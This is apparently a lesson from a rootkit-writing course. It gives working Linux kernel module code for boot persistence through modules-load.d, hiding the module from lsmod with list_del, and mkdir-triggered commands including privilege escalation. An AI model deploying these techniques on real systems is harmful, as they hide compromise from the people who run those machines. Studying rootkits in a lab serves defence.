# M00: Persistence and Stealth

Your module works until reboot, and anyone can see it in `lsmod`.
Fix both.

## Persistence

systemd reads every `.conf` file in `/etc/modules-load.d/` at boot and loads the
named modules.
Writing "rklings" to that directory makes the module survive reboot:

```c
static int rk_persist(void)
{
	struct file *f;
	loff_t pos = 0;

	f = filp_open("/etc/modules-load.d/rklings.conf",
		      O_WRONLY | O_CREAT | O_TRUNC, 0644);
	if (IS_ERR(f))
		return PTR_ERR(f);
	kernel_write(f, "rklings\n", sizeof("rklings"), &pos);
	filp_close(f, NULL);
	return 0;
}
```

`sizeof("rklings")` is 8 (7 characters plus the NUL terminator).
That matches the 8 bytes in `"rklings\n"` (7 characters plus newline), so the
newline is written but the NUL is not.

`filp_open` opens a file from kernel context (no userspace fd table).
`kernel_write` writes without copy_from_user.
`O_TRUNC` replaces existing content.
Unpersist writes an empty file to the same path.

## Module hiding

The kernel tracks loaded modules in a doubly-linked list.
`lsmod` iterates this list.
Removing your node makes the module invisible:

```c
void rk_module_hide(void)
{
	saved_prev = THIS_MODULE->list.prev;
	list_del(&THIS_MODULE->list);
}

void rk_module_unhide(void)
{
	list_add(&THIS_MODULE->list, saved_prev);
}
```

`THIS_MODULE` is a pointer to the current module's `struct module`.
`list_del` removes the node from the list.
`saved_prev` remembers the insertion point so `list_add` can restore it.
The module still runs, it just disappears from `lsmod` and `/proc/modules`.

## Multi-file split

This is your first multi-file kernel module.
The L09 monolith splits into subsystems, each in its own file:

```text
  mkdir rklings.persist
    |
    v
  dispatch.c: strip "rklings." prefix, longest-prefix match
    |
    v
  module.c: cmd_persist() --> rk_persist()
    |
    v
  filp_open + kernel_write --> /etc/modules-load.d/rklings.conf
```

Each file registers only its own commands via `rk_cmd_register`:

- `cred.c` registers `"e"` (escalation)
- `module.c` registers `persist`, `unpersist`, `h.m`, `u.m`
- `init.c` registers `ping`, `status`

## Command dispatch

`rk_cmd_register(key, handler)` adds entries to a static array.
`rk_dispatch(name)` strips the `"rklings."`
prefix, then finds the longest matching key.
`"persist"` matches `"persist"` exactly.
`"e.1234"` matches `"e"` with arg `"1234"`.

## You write

`main.c`, ~250 lines (starter provides dispatch + escalation from L09):

- `rk_persist()` and `rk_unpersist()` using filp_open + kernel_write
- `rk_module_hide()` and `rk_module_unhide()` using list_del/list_add
- Four command handlers registered via `rk_cmd_register`
- Everything in one file (the solution refactors into multi-file for M01)

## API

```c
// Command registration (dispatch.c)
typedef int (*rk_handler_t)(const char *arg);
struct rk_cmd_entry { const char *key; rk_handler_t handler; };
int rk_cmd_register(const char *key, rk_handler_t handler);
int rk_cmds_register(const struct rk_cmd_entry *cmds, int n);
int rk_dispatch(const char *name);

// Persistence (module.c)
struct file *filp_open(const char *path, int flags, umode_t mode);
ssize_t kernel_write(struct file *f, const void *buf, size_t count,
    loff_t *pos);
int filp_close(struct file *f, fl_owner_t id);

// Module hiding (module.c)
list_del(&THIS_MODULE->list);
list_add(&THIS_MODULE->list, saved_prev);

// Subsystem init
int rk_cred_init(void);      // registers "e"
int rk_module_cmds_init(void);  // registers persist, unpersist, h.m, u.m
```

8 mkdir commands:

| Command | Owner |
|---------|-------|
| `rklings.e` / `rklings.e.<pid>` | cred.c |
| `rklings.ping` | init.c |
| `rklings.status` | init.c |
| `rklings.persist` | module.c |
| `rklings.unpersist` | module.c |
| `rklings.h.m` | module.c |
| `rklings.u.m` | module.c |

## Test it

```
$ rklings run m00
root@vm:~# insmod rklings.ko
root@vm:~# mkdir rklings.persist
root@vm:~# cat /etc/modules-load.d/rklings.conf
rklings
root@vm:~# mkdir rklings.h.m
root@vm:~# lsmod | grep rklings
(no output)
root@vm:~# mkdir rklings.u.m
root@vm:~# lsmod | grep rklings
rklings  16384  0
root@vm:~# mkdir rklings.unpersist
root@vm:~# cat /etc/modules-load.d/rklings.conf
(empty)
```

## Validate

```
$ rklings validate m00
  [+] module loaded
  [+] persist writes /etc/modules-load.d/rklings.conf
  [+] unpersist clears conf file
  [+] module hidden from lsmod
  [+] module unhidden, visible again
  [+] escalation still works
  [+] module unloads cleanly after unhide
  PASS
```

## Next

L10 builds the thread-safe target list that tracks what to hide from ls, ps,
cat, and ss.
